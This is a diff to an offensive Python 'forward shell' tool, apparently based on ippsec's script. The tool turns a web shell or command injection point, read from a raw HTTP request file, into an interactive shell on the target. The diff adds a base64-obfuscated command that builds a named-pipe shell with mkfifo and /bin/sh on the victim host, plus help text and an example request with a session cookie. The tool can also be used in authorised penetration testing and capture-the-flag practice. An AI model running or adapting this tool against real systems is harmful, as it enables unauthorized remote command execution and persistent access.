@@ -24,10 +24,10 @@ class WebShell(object):
     parser = argparse.ArgumentParser(
             prog="Forward Shell",
             description="An all purpose expansion over ippsec's forward shell script")
-    parser.add_argument('-r', '--request', required=True) # request file to read from
-    parser.add_argument('-i', '--interval', type=float, required=True) # interval between every read request
-    parser.add_argument('-p', '--proxy', required=False) # proxy for debugging
-
+    parser.add_argument('-r', '--request', required=True, help='Request file to read from. Replace injection point with keyword INJECT') # request file to read from
+    parser.add_argument('-i', '--interval', type=float, required=True, help='Time between two read requests') # interval between every read request
+    parser.add_argument('-p', '--proxy', required=False, help='Proxy for debugging') # proxy for debugging
+    
     # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
     def __init__(self):
         
@@ -36,10 +36,11 @@ class WebShell(object):
         
         # Read request file
         self.request_object = self.ReadHttpRaw(args.request)
-
-        # MODIFY THIS, URL
-        # self.url = r"http://192.168.0.108/webshell.php"
+        
+        # setup misc
         self.proxies = {'http' : args.proxy}
+
+        # setup session
         session = random.randrange(10000,99999)
         print(f"[*] Session ID: {session}")
         self.stdin = f'/dev/shm/input.{session}'
@@ -47,18 +48,34 @@ class WebShell(object):
         self.interval = args.interval
 
         # set up shell
-        print("[*] Setting up fifo shell on target")
-        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
+        print("[*] Setting up fifo shell on target")    
+        MakeNamedPipes = "echo -n "+base64.b64encode(f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}".encode('utf-8')).decode('utf-8')+"|base64 -d|bash"
         self.RunRawCmd(MakeNamedPipes, timeout=0.1)
 
         # set up read thread
         print("[*] Setting up read thread")
-        interval = args.interval
         thread = threading.Thread(target=self.ReadThread, args=())
         thread.daemon = True
         thread.start()
 
     # Read raw HTTP request
+    # Request Object:
+    # {
+    #   'request_line': {
+    #       'verb':'POST',
+    #       'endpoint':'/webshell.php',
+    #       'version':'HTTP/1.1'
+    #       }
+    #   'headers':{
+    #       'Host':'127.0.0.1',
+    #       'Cookies': 'session=ad343fvdj675'
+    #   }
+    #   'data':{
+    #       'cmd':'whoami',
+    #       'username':'username',
+    #       'password':'password'
+    #   }
+    # }
     def ReadHttpRaw(self, requestFile):
         request_object = {'request_line': {}}
         with open(requestFile, 'r') as f:
@@ -90,6 +107,8 @@ class WebShell(object):
                         better_body.append(i)
 
                 request_object['data'] = dict(better_body)
+            else:
+                request_object['data'] = {}
 
         return request_object
 
@@ -119,7 +138,13 @@ class WebShell(object):
             proxies = {}
          
         try:
-            r = requests.request(attack_object['request_line']['verb'], "http://"+attack_object['headers']['Host']+attack_object['request_line']['endpoint'], headers=attack_object['headers'], data=attack_object['data'], proxies=self.proxies, timeout=timeout)
+            r = requests.request(attack_object['request_line']['verb'],
+                                 "http://"+attack_object['headers']['Host']+attack_object['request_line']['endpoint'],
+                                 headers=attack_object['headers'],
+                                 data=attack_object['data'],
+                                 proxies=self.proxies,
+                                 timeout=timeout
+                                 )
 
             return r.text
         except Exception as e:
@@ -142,7 +167,7 @@ S = WebShell()
 while True:
     cmd = input(prompt)
     if cmd == "upgrade":
-        prompt = "\b"
+        prompt = ""
         S.UpgradeShell()
     else:
         S.WriteCmd(cmd)
